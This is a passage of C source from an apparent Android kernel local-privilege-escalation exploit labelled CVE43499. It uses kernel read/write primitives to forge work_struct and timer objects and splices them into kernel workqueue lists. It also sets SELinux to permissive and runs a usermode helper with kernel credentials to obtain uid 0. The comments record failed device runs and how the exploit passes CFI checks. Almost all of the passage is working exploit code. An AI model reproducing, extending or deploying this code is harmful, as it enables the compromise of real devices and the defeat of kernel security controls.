    for (size_t i = 0; i < sizeof(probes) / sizeof(probes[0]); i++) {
      uint64_t v = 0;
      if (!umh_read64(fd, probes[i], &v, "w2.read")) {
        rmg_diag("ROOT slabw2 addr=%016zx read FAILED\n", probes[i]);
        continue;
      }
      rmg_diag("ROOT slabw2 addr=%016zx val=%016llx -> write back\n", probes[i],
               (unsigned long long)v);
      if (fork() == 0) {
        int ok = root_write64(fd, probes[i], v);
        rmg_diag("ROOT slabw2 addr=%016zx write_ok=%d\n", probes[i], ok);
        _exit(0);
      }
      int st = 0;
      waitpid(-1, &st, 0);
      uint64_t after = 0;
      if (umh_read64(fd, probes[i], &after, "w2.verify") && after == v) {
        rmg_diag("ROOT slabw2 addr=%016zx WRITABLE (value intact)\n", probes[i]);
      } else {
        rmg_diag("ROOT slabw2 addr=%016zx write did not stick after=%016llx\n",
                 probes[i], (unsigned long long)after);
      }
    }
    rmg_diag("ROOT slabw2 survey complete\n");
    return 0;
  }

  /* Is the slab-write panic inherent, or specific to the worklist address?
   *
   * Everything currently blocked (the workqueue splice and the PTY/SAK ops publish) needs a slab
   * WRITE, and the only evidence so far is one faulting pwrite at pool->worklist. That is not
   * enough to call slab unwritable: the worklist head sits at the head of a slab page that the
   * reader can resolve, whereas other slab objects may live on pages the writer's mapping
   * resolves differently. So probe a spread of slab addresses - the same objects the READ path
   * succeeds on - writing each value back UNCHANGED. A write that stores the identical value is
   * still a real store to that address, so it answers the question without altering state.
   *
   * Read the value first, then write it straight back. If the write lands, the word is
   * unchanged; if it faults, the machine dies having changed nothing. Parent logs every
   * address BEFORE attempting, so the last logged address identifies the faulting one.
   * Opt-in: it WILL reboot on the first slab address that is unwritable. */
  if (getenv("ROOT_SLAB_W")) {
    static const uintptr_t probes[] = {
        0xffffff80011d0000ULL, 0xffffff80011d8830ULL, 0xffffff80011dba00ULL,
        0xffffff80011d9000ULL, 0xffffff80011da000ULL, 0xffffff8001000000ULL,
        0xffffff8002000000ULL, 0xffffff8080000000ULL,
    };
    for (size_t i = 0; i < sizeof(probes) / sizeof(probes[0]); i++) {
      uint64_t v = 0;
      if (!umh_read64(fd, probes[i], &v, "slabw.read")) {
        rmg_diag("ROOT slabw addr=%016zx read FAILED (unreadable, skipping)\n", probes[i]);
        continue;
      }
      rmg_diag("ROOT slabw addr=%016zx val=%016llx -> writing it back\n",
               probes[i], (unsigned long long)v);
      /* fork so the parent has already logged and can log the result. */
      if (fork() == 0) {
        int ok = root_write64(fd, probes[i], v);
        rmg_diag("ROOT slabw addr=%016zx write_ok=%d\n", probes[i], ok);
        _exit(0);
      }
      int st = 0;
      waitpid(-1, &st, 0);
      uint64_t after = 0;
      if (umh_read64(fd, probes[i], &after, "slabw.verify") && after == v) {
        rmg_diag("ROOT slabw addr=%016zx CONFIRMED WRITABLE (value unchanged)\n", probes[i]);
      } else {
        rmg_diag("ROOT slabw addr=%016zx write did not stick (after=%016llx)\n",
                 probes[i], (unsigned long long)after);
      }
    }
    rmg_diag("ROOT slabw survey complete\n");
    return 0;
  }

  uintptr_t worklist = pool + POOL_WORKLIST_OFF;
  uint64_t list_next = 0;
  uint64_t list_prev = 0;
  /* The gate is "the list is empty", not "nr_idle > 0".
   *
   * nr_idle on system_unbound_wq's per-node unbound pool is 0 almost all the time on a live
   * phone, so requiring it made this the first silent dead end: 200 iterations x 1ms and 600
   * pipe operations spent proving the pool was busy, and then it bailed before ever
   * touching the worklist. The predicate that actually matters for a list insert is that
   * there is no in-flight work to interleave with. */
  for (int i = 0; i < 8; i++) {
    if (!umh_read64(fd, worklist, &list_next, "worklist.next") ||
        !umh_read64(fd, worklist + sizeof(uint64_t), &list_prev, "worklist.prev")) {
      pr_error("root umh pool state read failed\n");
      goto cleanup;
    }
    if (list_next == worklist && list_prev == worklist) {
      break;
    }
    usleep(1000);
  }
  rmg_diag("ROOT umh pool=%016zx worklist=%016zx list=%016llx/%016llx\n", pool,
           worklist, (unsigned long long)list_next, (unsigned long long)list_prev);
  if (list_next != worklist || list_prev != worklist) {
    pr_error("root umh pool busy pool=%016zx list=%016llx/%016llx "
             "head=%016zx\n",
             pool, (unsigned long long)list_next,
             (unsigned long long)list_prev, worklist);
    rmg_diag("ROOT umh pool BUSY (worklist not empty)\n");
    goto cleanup;
  }

  /* The scratch relocation that used to live here moved to the top of this
   * function: the placement has to happen before any pointer into the scratch
   * is derived, and configfs_write_once() only reaches kernel .data. See
   * umh_data_scratch_place() above - it also owns the ROOT_DATA_SCRATCH env
   * handling (survey / forced / auto) that used to sit here.
   */
  /* (removed: the ROOT_DATA_SCRATCH survey/forced/auto handling that used
   * to occupy this block now lives in umh_data_scratch_place(), called at
   * the top of this function, because the placement must precede every
   * pointer derived from the scratch address.) */

  uintptr_t fake_entry = fake_work_addr + WORK_ENTRY_OFF;
  /* POOL_DATA_OFF is a verified no-op placeholder: work_struct::data only needs WORK_STRUCT_FLAG_BITS
     in its low bits plus a colour that the kernel compares against pwq->work_color. Since pwq is
     per-cpu and unreadable we cannot read the real colour, so use 0 and let the kernel re-check.
     The authoritative property is func, which must be the real kernel text address so CFI passes. */
  uint64_t work_data = WORK_STRUCT_FLAG_BITS;
  struct umh_subprocess_info fake;
  memset(&fake, 0, sizeof(fake));
  memcpy(fake.work + WORK_DATA_OFF, &work_data, sizeof(work_data));
  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t),
         &worklist, sizeof(worklist));
  memcpy(fake.work + WORK_FUNC_OFF, &umh_work_func,
         sizeof(umh_work_func));
  fake.complete = completion_addr;
  fake.path = path_addr;
  fake.argv = argv_addr;
  fake.envp = envp_addr;

  rmg_diag("ROOT umh prewrite data=%016zx len=%zu work=%016zx len=%zu entry=%016zx\n",
           umh_data_addr, sizeof(umh_data), fake_work_addr, sizeof(fake), fake_entry);
  int data_write = root_write_data(
      fd, umh_data_addr, &umh_data, sizeof(umh_data));
  rmg_diag("ROOT umh data_write=%d\n", data_write);
  int work_write = root_write_data(
      fd, fake_work_addr, &fake, sizeof(fake));
  rmg_diag("ROOT umh work_write=%d\n", work_write);
  if (!data_write || !work_write ||
      !root_read_data(fd, umh_data_addr, scratch_readback,
                      sizeof(umh_data)) ||
      memcmp(scratch_readback, &umh_data, sizeof(umh_data)) != 0 ||
      !root_read_data(fd, fake_work_addr, scratch_readback,
                      sizeof(fake)) ||
      memcmp(scratch_readback, &fake, sizeof(fake)) != 0) {
    pr_error("root umh scratch write/readback failed data=%d work=%d\n",
             data_write, work_write);
    goto cleanup;
  }

  rmg_diag("ROOT umh worklist=%016zx recheck=%016llx/%016llx\n", worklist,
           (unsigned long long)list_next, (unsigned long long)list_prev);
  if (selinux_old != permissive) {
    selinux_changed = 1;
    if (!root_write_global(fd, selinux_addr, &permissive,
                           sizeof(permissive)) ||
        !root_read_global(fd, selinux_addr, &selinux_readback,
                          sizeof(selinux_readback)) ||
        selinux_readback != permissive) {
      pr_error("root umh selinux write/readback failed now=%u\n",
               selinux_readback);
      goto cleanup;
    }
  }

  if (!root_read64(fd, worklist, &list_next) ||
      !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
      list_next != worklist || list_prev != worklist) {
    pr_error("root umh worklist changed before queue next=%016llx prev=%016llx\n",
             (unsigned long long)list_next,
             (unsigned long long)list_prev);
    goto cleanup;
  }

  /* Link the forged work_struct into pool->worklist. Verified empty above, and re-verified
   * immediately before this write so we never splice into a list the kernel has since used.
   * Only two writes are needed: worklist->prev = entry (the empty-list case) and
   * worklist->next = entry, which makes the single entry the whole list. The per-cpu
   * nr_in_flight/nr_active/refcnt updates that used to precede this were per-cpu and are gone;
   * they are the kernel's internal accounting, not a precondition for process_one_work(). */
  list_prev_changed = 1;
  int list_prev_write = root_write64_exact(
      fd, worklist + sizeof(uint64_t), fake_entry);
  if (!list_prev_write ||
      !root_read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
      list_prev != fake_entry) {
    pr_error("root umh worklist prev write failed ret=%d prev=%016llx want=%016zx\n",
             list_prev_write, (unsigned long long)list_prev, fake_entry);
    goto cleanup;
  }

  int list_next_write = root_write64(fd, worklist, fake_entry);
  uint64_t published_next = 0;
  uint64_t published_prev = 0;
  if (list_next_write ||
      (root_read64(fd, worklist, &published_next) &&
       published_next == fake_entry)) {
    /* Full round-trip: both ends must now name the single forged entry, and the entry itself
     * must point back at the worklist. Anything less means the splice did not land. */
    if (!root_read64(fd, worklist, &published_next) ||
        !root_read64(fd, worklist + sizeof(uint64_t), &published_prev) ||
        !root_read64(fd, fake_entry, &list_next) ||
        !root_read64(fd, fake_entry + sizeof(uint64_t), &list_prev)) {
      pr_error("root umh worklist readback failed\n");
      goto cleanup;
    }
    if (published_next != fake_entry || published_prev != fake_entry ||
        list_next != worklist || list_prev != worklist) {
      pr_error("root umh splice incomplete list=%016llx/%016llx entry=%016llx/%016llx "
               "want entry=%016zx list=%016zx\n",
               (unsigned long long)published_next,
               (unsigned long long)published_prev,
               (unsigned long long)list_next, (unsigned long long)list_prev,
               fake_entry, worklist);
      goto cleanup;
    }
    published = 1;
  } else {
    pr_error("root umh publish failed ret=%d next=%016llx\n",
             list_next_write, (unsigned long long)published_next);
    goto cleanup;
  }
  rmg_diag("ROOT umh PUBLISHED wq=%016zx pool=%016zx worklist=%016zx work=%016zx "
           "entry=%016zx writes=%d/%d/%d\n",
           wq, pool, worklist, fake_work_addr, fake_entry,
           data_write, work_write, list_prev_write, list_next_write);
  pr_info("root umh queued wq=%016zx pool=%016zx worklist=%016zx "
          "work=%016zx entry=%016zx writes=%d/%d/%d/%d\n",
          wq, pool, worklist, fake_work_addr, fake_entry,
          data_write, work_write, list_prev_write, list_next_write);

  int wake_ok = 0;
  rmg_diag("ROOT umh waiting for completion at %016zx\n", completion_addr);
  for (int i = 0; i < 8 && !complete_done; i++) {
    wake_ok |= wake_system_unbound();
    for (int j = 0; j < 25; j++) {
      /* The completion lives in OUR reclaimed page, so read it through the configfs AAR,
       * not the pipe. The pipe path costs 4 descriptor read-modify-writes per 4-byte poll
       * (2000 of them for a flag that only a real kworker can ever set), and every one of
       * those is a window on a live ring slot. */
      if (!root_read_global(fd, completion_addr, &complete_done,
                            sizeof(complete_done))) {
        pr_error("root umh completion read failed\n");
        goto cleanup;
      }
      if (complete_done) {
        break;
      }
      usleep(1000);
    }
  }

  /* exec_async's out: label runs umh_complete() only when kernel_execve()
   * RETURNED, i.e. failed: on success the new thread becomes the helper and
   * never comes back, so completion.done stays 0 and done==1 is the FAILURE
   * signal (with retval in sub_info->retval). The real success signal is the
   * helper's own socket and creds file, so poll those for BOTH outcomes - the
   * old code only checked the socket when complete_done was set, which is
   * exactly the case in which the helper never ran, so a successful UMH was
   * reported as a failure. */
  uint32_t retval_value = 0;
  if (complete_done &&
      !root_read32(fd,
                   fake_work_addr +
                       offsetof(struct umh_subprocess_info, retval),
                   &retval_value)) {
    pr_error("root umh retval read failed\n");
    goto cleanup;
  }
  int32_t umh_retval = (int32_t)retval_value;
  for (int i = 0; i < 300 && !socket_ok; i++) {
    if (root_socket_ready() || access(ROOT_CREDS_SENTINEL, F_OK) == 0) {
      socket_ok = 1;
      break;
    }
    usleep(10000);
  }

  pr_info("root umh result wake=%d complete=%u retval=%d socket=%d\n",
          wake_ok, complete_done, umh_retval, socket_ok);
  result = socket_ok;

cleanup:
  if (!published) {
    /* Only the worklist->prev write needs undoing. The per-cpu pwq counter rollbacks that used
     * to live here were removed with the dfl_pwq chase: those counters live in the percpu
     * pool_workqueue, which is unreadable on this firmware, so they were never writable here in
     * the first place. */
    int rollback_ok = 1;
    if (list_prev_changed) {
      rollback_ok &= root_restore64(
          fd, worklist + sizeof(uint64_t), fake_entry, list_prev);
    }
    if (!rollback_ok) {
      pr_error("root umh prepublish rollback failed\n");
    }
  } else if (!complete_done) {
    pr_error("root umh published but incomplete; scratch retained\n");
  }

  if (scratch_saved && (!published || complete_done)) {
    int work_restore = root_write_data(
        fd, fake_work_addr, saved_work, sizeof(saved_work));
    int data_restore = root_write_data(
        fd, umh_data_addr, saved_data, sizeof(saved_data));
    int work_read = root_read_data(
        fd, fake_work_addr, scratch_readback, sizeof(saved_work));
    int work_match = work_read &&
                     memcmp(scratch_readback, saved_work,
                            sizeof(saved_work)) == 0;
    int data_read = root_read_data(
        fd, umh_data_addr, scratch_readback, sizeof(saved_data));
    int data_match = data_read &&
                     memcmp(scratch_readback, saved_data,
                            sizeof(saved_data)) == 0;
    pr_info("root umh scratch restore work=%d/%d data=%d/%d\n",
            work_restore, work_match, data_restore, data_match);
    if (!work_restore || !work_match || !data_restore || !data_match) {
      pr_error("root umh scratch restore failed\n");
    }
  }

  if (!result && selinux_changed && (!published || complete_done)) {
    uint8_t current = 0xff;
    int read_ok = root_read_global(fd, selinux_addr, &current,
                                   sizeof(current));
    int restore_ok = read_ok &&
        (current == selinux_old ||
         (current == permissive &&
          root_write_global(fd, selinux_addr, &selinux_old,
                            sizeof(selinux_old)) &&
          root_read_global(fd, selinux_addr, &current, sizeof(current)) &&
          current == selinux_old));
    pr_info("root umh selinux rollback=%d old=%u now=%u\n",
            restore_ok, selinux_old, current);
    if (!restore_ok) {
      pr_error("root umh selinux rollback failed\n");
    }
  } else if (!result && selinux_changed) {
    pr_error("root umh selinux retained while published work is incomplete\n");
  } else if (result) {
    pr_info("root umh selinux left=%u intended root state old=%u\n",
            permissive, selinux_old);
  }

  rmg_diag("ROOT umh done done=%d retval=%d socket_ok=%d wake=%d result=%d\n",
           complete_done, (int)umh_retval, socket_ok, wake_ok, result);
  root_child_done = socket_ok;
  root_uid_after = socket_ok ? 0 : root_uid_before;
  return result;
}

/* =====================================================================================
 * Static-work UMH stage (now the default fallback after workqueue failure)
 * =====================================================================================
 *
 * Both stages above need a SLAB write: the PTY stage repoints tty->ops and
 * the splice stage links a forged work_struct into pool->worklist, and both
 * objects live in the boot kmalloc arena. The only SLAB writer on this
 * firmware is the pipe physrw primitive, whose reclaim cache gate has never
 * been observed completing ("PHYS reclaim gave up after 4 passes"). There is
 * a third queueing route that needs no SLAB write at all: static work_structs
 * live in kernel .data, and at any instant many of them are QUEUED - their
 * entry is linked into a worker_pool's worklist and a kworker dequeues and
 * runs them within milliseconds. Such a work is forgeable from .data alone,
 * which is exactly the window the configfs writer can reach:
 *
 *   - work_struct::data and ::entry are PRESERVED byte for byte, so the
 *     pending bit and the list links stay exactly as the kernel queued them
 *     and the dequeue that is already in flight still walks this entry;
 *   - work_struct::func becomes the real call_usermodehelper_exec_work text
 *     address - type-identical to work->func, so CFI passes;
 *   - the subprocess_info that container_of() resolves to is written over the
 *     work_struct itself (work is subprocess_info's first member, BTF-confirmed
 *     on this build: work@0, complete@48, path@56, argv@64, envp@72, wait@80,
 *     retval@84, init@88, cleanup@96, data@104, size 112), its tail fields
 *     landing in the 64 bytes that follow every 48-byte work_struct.
 *
 * When the kworker dequeues it, call_usermodehelper_exec_work(work) runs in
 * a kworker (init_cred), sees wait == UMH_NO_WAIT and fires
 * kernel_thread(call_usermodehelper_exec_async, sub_info, CLONE_PARENT|SIGCHLD);
 * that thread takes full kernel creds (prepare_kernel_cred/commit_creds) and
 * kernel_execve()s CVE43499_ROOT_HELPER, which writes
 * /data/local/tmp/temp_su.creds as uid 0 in u:r:kernel:s0.
 *
 * Detection: umh_complete() runs only on the FAILURE path (exec_async's out:
 * label is reached only when kernel_execve returned), so completion.done==1
 * means the UMH failed. Success is the helper's own socket/creds file, exactly
 * as in the workqueue stage.
 *
  * Candidate selection scans the writable .data window for queued or
  * off-queue work_struct shapes: the queued-work pwq proof or a small
  * off-queue data word, a self-pointing or otherwise plausible entry, and a
  * .text function pointer. The list invariant is checked only when the
  * neighbour is also inside the writable .data window, because SLAB reads
  * can hang the direct configfs reader. Only candidates with a zero
  * subprocess-info tail are used by default; ROOT_STATIC_WORK=2 selects one
  * nonzero-tail fallback when no clean span was found.
  *
  * Two bounded hazards, both handled:
  *   1. A false positive (mitigated by the queued-work pwq proof, plausible
  *      entry, .text function, neighbour invariant when readable, and the
  *      zero-tail requirement).
  *   2. After our func runs once, the owning subsystem may re-queue the work
  *      and run our func AGAIN. The stage therefore restores only the forged
  *      func and subprocess-info tail after detection: the kernel-owned data
  *      word and entry must be left alone so a re-queue or concurrent dequeue
  *      does not corrupt the worklist. */

/* =====================================================================================
 * Hang-contained bulk reader for the static-work scan.
 *
 * configfs_read_once() does not FAIL on an unreachable target, it HANGS: the
 * pread blocks in the configfs fill_read_buffer() path and the run dies with an
 * 'RD target=...' line and no matching 'RD pread ret='. Measured on RFCWC0G1Z1J
 * 2026-10-03: 554 of 555 reads returned normally, and the one failure was the
 * FIRST chunk of this very scan - the exact first byte of .data, kaslr+0x2a30000
 * = ffffffc00ab40000 - which logged
 *   RD target=ffffffc00ab40000 page=92978c5edb3d9b7c pos=0x6d6873612f766484 len=224
 * and never returned. page = target - (ASHMEM_PREFIX_COUNT - len) had underflowed
 * to a non-canonical value, so the read faulted inside the kernel instead of
 * returning an error. Note the *successful* reads carry equally odd page values
 * (92978c5edb8bfd7c and friends), so a "looks like an address" test is not the
 * discriminator - the target itself is.
 *
 * A blind 30k-chunk scan cannot afford one hang per bad address, so the scan runs
 * in a forked child that publishes every finished chunk through SHARED memory
 * along with the address it is currently reading. The parent therefore never loses
 * work: whatever the child completed is kept, and if the child stops advancing the
 * parent kills it, logs the single address that stalled, and resumes just past it.
 * One fork per BATCH rather than per chunk keeps this affordable - 5.2 MB at a
 * 176-byte step is ~30k chunks, i.e. ~160 batches.
 */
#define SCAN_BATCH 192

struct scan_shared {
  volatile int done;
  volatile size_t filled;
  volatile uintptr_t cur;
  volatile size_t stalled_at;
  volatile size_t n_stall;
  volatile size_t n_hang;
  uintptr_t addr[SCAN_BATCH];
  uint8_t recs[SCAN_BATCH][UMH_STATIC_SCAN_CHUNK];
  uint8_t ok[SCAN_BATCH];
};

/* Fetches the next batch of chunks, advancing *cursor past everything consumed and
 * past any address that misbehaved. Returns how many chunk records are valid.
 *
 * A bad target does not make configfs_read_once() fail - it wedges it, and the
 * process is SIGKILLed while blocked there, taking the whole run with it. That is
 * what killed runs 3-8 at the bottom of .data and what still kills this scan after
 * a few thousand good chunks, so containment is not optional here. The child
 * publishes each finished chunk plus the address it is currently reading, so the
 * parent always keeps the work already banked and can name the one address that
 * stalled. The scan runs at ~38k chunks/s, so one fork per 192 chunks costs
 * nothing measurable. */
static size_t scan_fetch_batch(int fd, uintptr_t *cursor, uintptr_t win_hi,
                               struct scan_shared *sh, int timeout_ms) {
  size_t want = 0;
  while (want < SCAN_BATCH) {
    uintptr_t a = *cursor + (uintptr_t)(want * UMH_STATIC_SCAN_STEP);
    if (a + UMH_STATIC_SCAN_CHUNK > win_hi) {
      break;
    }
    sh->addr[want++] = a;
  }
  if (!want) {
    return 0;
  }

  sh->done = 0;
  sh->filled = 0;
  sh->cur = 0;
  sh->stalled_at = (size_t)-1;
  memset(sh->ok, 0, want);

  pid_t pid = fork();
  if (pid < 0) {
    rmg_diag("ROOT staticwork scan fork errno=%d\n", errno);
    return 0;
  }
  if (pid == 0) {
    configfs_quiet = 1;
    for (size_t i = 0; i < want; i++) {
      sh->cur = sh->addr[i];
      if (configfs_read_once(fd, sh->addr[i], sh->recs[i],
                             UMH_STATIC_SCAN_CHUNK) !=
          (ssize_t)UMH_STATIC_SCAN_CHUNK) {
        sh->stalled_at = i;
        sh->filled = i;
        sh->n_stall++;
        sh->cur = 0;
        sh->done = 1;
        _exit(0);
      }
      sh->ok[i] = 1;
      sh->filled = i + 1;
    }
    sh->cur = 0;
    sh->done = 1;
    _exit(0);
  }

  for (int waited = 0; waited < timeout_ms && !sh->done; waited += 10) {
    struct timespec ts = {0, 10 * 1000 * 1000};
    nanosleep(&ts, NULL);
  }
  size_t got = sh->filled;
  int hung = 0;
  uintptr_t hung_at = 0;
  if (!sh->done) {
    hung = 1;
    hung_at = sh->cur;
    sh->n_hang++;
    kill(pid, SIGKILL);
  }
  /* Reap WITHOUT blocking. A child wedged in the configfs read cannot be retired
   * until that read returns, so a plain waitpid() here would hang the parent in
   * exactly the way we are trying to escape. Poll with WNOHANG and walk away. */
  int st = 0;
  int reaped = 0;
  for (int i = 0; i < 30; i++) {
    pid_t w = waitpid(pid, &st, WNOHANG);
    if (w == pid || (w < 0 && errno == ECHILD)) {
      reaped = 1;
      break;
    }
    struct timespec ts = {0, 10 * 1000 * 1000};
    nanosleep(&ts, NULL);
  }
  if (!reaped) {
    rmg_diag("ROOT staticwork scan child pid=%d unreaped (abandoned)\n", (int)pid);
  }
  if (got > want) {
    got = want;
  }

  if (hung) {
    rmg_diag("ROOT staticwork scan STALL at %016zx after %zu/%zu chunks\n",
             hung_at, got, want);
    *cursor = hung_at + UMH_STATIC_SCAN_STEP;
  } else if (sh->stalled_at != (size_t)-1 && sh->stalled_at < want) {
    rmg_diag("ROOT staticwork scan unreadable at %016zx (%zu/%zu read)\n",
             sh->addr[sh->stalled_at], got, want);
    *cursor = sh->addr[sh->stalled_at] + UMH_STATIC_SCAN_STEP;
  } else if (got) {
    *cursor = sh->addr[got - 1] + UMH_STATIC_SCAN_STEP;
  } else {
    *cursor += 0x1000;
  }
  return got;
}

/* Log the signal number on a fault in this stage. Runs 3-14 all ended with the
   durable log stopping mid-stage and the stdout buffer lost, which is the
   signature of a fatal signal rather than a clean exit; without this the cause is
   invisible. */
static void staticwork_fault_handler(int sig) {
  rmg_diag("ROOT staticwork FATAL signal=%d\n", sig);
  _exit(128 + sig);
}

static int install_static_work_umh_root(int fd) {
  rmg_diag("ROOT staticwork enter fd=%d\n", fd);
  /* Standalone liveness probe. Everything from here to the last log line has run
     to completion in some run and then the process was gone, with reads unchanged
     across the whole wait loop - so the kill is NOT inside this function. Print a
     heartbeat from a detached child: if the parent's own log stops while the
     child's keeps advancing, the parent is being killed while the child lives,
     which points at the parent's own exit path rather than anything the stage
     does. */
  if (getenv("ROOT_STATIC_HEARTBEAT")) {
    pid_t hb = fork();
    if (hb == 0) {
      for (int i = 0; i < 120; i++) {
        rmg_diag("ROOT staticwork HEARTBEAT %d\n", i);
        usleep(500000);
      }
      _exit(0);
    }
    rmg_diag("ROOT staticwork heartbeat child pid=%d\n", (int)hb);
  }
  /* The helper payload lives in the same kind of .data scratch span the
   * workqueue stage uses: the configfs writer can only reach .data. */
  uintptr_t data_scratch_rel = umh_data_scratch_place(fd);
  if (!data_scratch_rel) {
    rmg_diag("ROOT staticwork no clean .data scratch span\n");
    return 0;
  }
  uintptr_t scratch_va = text_addr(KIMAGE_TEXT_BASE + data_scratch_rel);
  uintptr_t umh_data_addr = scratch_va + ROOT_UMH_DATA_OFF;

  const char *root_umh_path = ROOT_UMH_PATH;
#if defined(APP_PAYLOAD) && APP_PAYLOAD
  const char *app_root_umh_path = getenv("CVE43499_ROOT_HELPER");
  if (!app_root_umh_path || app_root_umh_path[0] != '/') {
    rmg_diag("ROOT staticwork missing CVE43499_ROOT_HELPER\n");
    pr_warning("root staticwork missing CVE43499_ROOT_HELPER\n");
    return 0;
  }
  root_umh_path = app_root_umh_path;
#endif

  /* Build the cascade payloads BEFORE the scan: the forged
   * terminal objects, their empty completions and the
   * path/argv/envp strings must all be in kernel .data
   * before any timer can be chained onto them. Each payload
   * is self-contained (its stub points only inside its own
   * block), so one payload per candidate keeps a consumed
   * stub from poisoning its neighbours. */
  struct umh_cascade_data cascade[UMH_CASCADE_STUBS];
  memset(cascade, 0, sizeof(cascade));
  for (size_t i = 0; i < UMH_CASCADE_STUBS; i++) {
    struct umh_cascade_data *pl = &cascade[i];
    uintptr_t base = umh_data_addr + (uintptr_t)(i * sizeof(*pl));
    uintptr_t completion_addr =
        base + offsetof(struct umh_cascade_data, completion);
    uintptr_t wait_list_addr =
        completion_addr + offsetof(struct umh_completion, next);
    uintptr_t path_addr =
        base + offsetof(struct umh_cascade_data, path);
    uintptr_t arg_addr =
        base + offsetof(struct umh_cascade_data, arg);
    uintptr_t uid_addr =
        base + offsetof(struct umh_cascade_data, uid);
    uintptr_t argv_addr =
        base + offsetof(struct umh_cascade_data, argv);
    uintptr_t envp_addr =
        base + offsetof(struct umh_cascade_data, envp);
    if (snprintf(pl->path, sizeof(pl->path), "%s", root_umh_path) >=
        (int)sizeof(pl->path)) {
      rmg_diag("ROOT staticwork helper path too long\n");
      pr_warning("root staticwork helper path too long\n");
      return 0;
    }
    snprintf(pl->arg, sizeof(pl->arg), "%s", "--umh");
    snprintf(pl->uid, sizeof(pl->uid), "%u", getuid());
    /* Empty completion: done = 0 and a self-pointing (empty)
     * wait list, so complete() on it after the exec only
     * bumps done and wakes nobody. */
    pl->completion.done = 0;
    pl->completion.next = wait_list_addr;
    pl->completion.prev = wait_list_addr;
    /* The terminal timer_list head: entry.next = 0 terminates
     * the bucket walk after this object, entry.pprev = 0 (the
     * cascade fills it in via next->pprev = pprev before the
     * object is consumed), expires = 0, flags clear of
     * TIMER_IRQSAFE, and the callback at +24 is
     * nfc_llcp_sdreq_timer - a genuine timer callback (CFI-clean)
     * that queues the forged work at +56 on system_wq. */
    pl->stub.timer_next = 0;
    pl->stub.timer_prev = 0;
    pl->stub.timer_expires = 0;
    pl->stub.timer_func = text_addr(NFC_LLCP_SDREQ_TIMER_FN);
    pl->stub.timer_flags = 0;
    pl->stub.timer_kabi0 = 0;
    pl->stub.timer_kabi1 = 0;
    /* The forged work_struct at stub+56: data = 0 (PENDING clear;
     * the queue path sets it), entry self-pointing (INIT_WORK
     * shape, so list_empty passes and no WARN fires), func =
     * call_usermodehelper_exec_work for the kworker. */
    pl->stub.work_data = 0;
    pl->stub.work_entry_next = (uint64_t)(base + 64);
    pl->stub.work_entry_prev = (uint64_t)(base + 64);
    pl->stub.work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);
    pl->stub.work_kabi0 = 0;
    pl->stub.work_kabi1 = 0;
    /* The subprocess_info tail call_usermodehelper_exec_async
     * reads. init and cleanup MUST stay 0: exec_async calls
     * init(sub_info, cred) when non-NULL and freeinfo calls
     * cleanup(sub_info) before kfree - both would jump
     * through .data. wait = 0 picks the async path, so the
     * kworker only kernel_threads the child and returns. */
    pl->stub.complete = (uint64_t)completion_addr;
    pl->stub.path = (uint64_t)path_addr;
    pl->stub.argv = (uint64_t)argv_addr;
    pl->stub.envp = (uint64_t)envp_addr;
    pl->stub.wait_retval = 0;
    pl->stub.init = 0;
    pl->stub.cleanup = 0;
    pl->stub.data = 0;
    pl->argv[0] = (uint64_t)path_addr;
    pl->argv[1] = (uint64_t)arg_addr;
    pl->argv[2] = (uint64_t)uid_addr;
    pl->argv[3] = 0;
    pl->envp[0] = 0;
  }
  uint64_t umh_work_func = text_addr(CALL_USERMODEHELPER_EXEC_WORK);

  /* The payload is planted AFTER the scan, not before it.
   *
   * Runs 3-6 all died at the first configfs READ of this stage, immediately after
   * "ROOT staticwork payload at ..." - and that write was the last event in the log
   * every time, with no read ever attempted after it. So the ordering is under
   * suspicion, not the address: 514 reads had already succeeded elsewhere in the
   * same runs (519 of them after earlier writes), and the scan itself was moved
   * to an address range that 507 distinct successful reads cover. Writing nothing
   * until a candidate exists also means a fruitless scan leaves .data untouched. */

  /* A list pointer is plausible when it names the direct map (where pool
   * worklists and the percpu areas live) or the kernel .data window. */
  const uintptr_t text_lo = text_addr(KIMAGE_TEXT_BASE + 0x10000ULL);
  const uintptr_t text_hi = text_addr(KIMAGE_TEXT_BASE + UMH_DATA_WIN_LO);

  /* Pass 1: shape-scan the writable .data window for static
   * work_structs in ANY state. The interesting ones are OFF-queue:
   * their owner re-queues them, and the kernel's own queueing
   * machinery (test_and_set_bit(PENDING), set_work_pwq(),
   * insert_work(), wake_up_worker()) then performs every pool-list
   * write itself, so a forge made while the work is off-queue
   * cannot corrupt the list and needs no SLAB write at all. The
   * window is read in 224-byte chunks (the configfs AAR's proven
   * read width) with a 48-byte overlap - one work_struct - so no
   * candidate straddling a chunk edge is missed. */
  const uintptr_t win_lo = text_addr(KIMAGE_TEXT_BASE + UMH_DATA_WIN_LO);
  const uintptr_t win_hi = text_addr(KIMAGE_TEXT_BASE + UMH_DATA_WIN_HI);
  struct umh_static_cand {
    uintptr_t addr;
    uint8_t orig[UMH_SUBPROCESS_INFO_SIZE];
    int offqueue;
    int forged;
  };
  struct umh_static_cand cands[UMH_STATIC_MAX_CANDS];
  size_t ncands = 0;
  struct umh_static_cand soft[UMH_STATIC_MAX_SOFT];
  size_t nsoft = 0;
  /* Accepting a candidate whose 64-byte tail is not zero padding - the
   * forge temporarily overwrites the owning object's fields until the
   * restore - is the DEFAULT. For a statically initialised work_struct
   * the bytes that follow it are the owner's other live fields, not
   * padding, so the strict zero-tail rule rejects essentially every
   * candidate in the window and would leave the stage with nothing to
   * forge (the strict rule only matches a work_struct that happens to
   * sit at the end of its owner). ROOT_STATIC_WORK=1 forces strict-only;
   * unset or =2 allow the fallback, which is used ONLY when no zero-tail
   * candidate exists anywhere in the window. */
  const char *static_work_mode = getenv("ROOT_STATIC_WORK");
  int soft_tail = !static_work_mode || static_work_mode[0] != '1';
  size_t chunks = 0;
  /* Rejection counters. Without them a failed scan is indistinguishable
   * from a scan that never matched anything: "no static work_struct
   * found" alone cannot say whether the window held no work_struct-shaped
   * object at all or whether one filter was too strict. Logged after the
   * pass so a single run reports exactly which filter to relax. */
  size_t n_state = 0, n_rej_entry = 0, n_rej_func = 0, n_rej_list = 0;
  size_t n_tail_nonzero = 0, n_readfail = 0;
  /* Start at 0x2a73000 and scan in-process - no forked reader.
   *
   * Measured 2026-10-03 on RFCWC0G1Z1J: 514 image reads succeeded in one run and
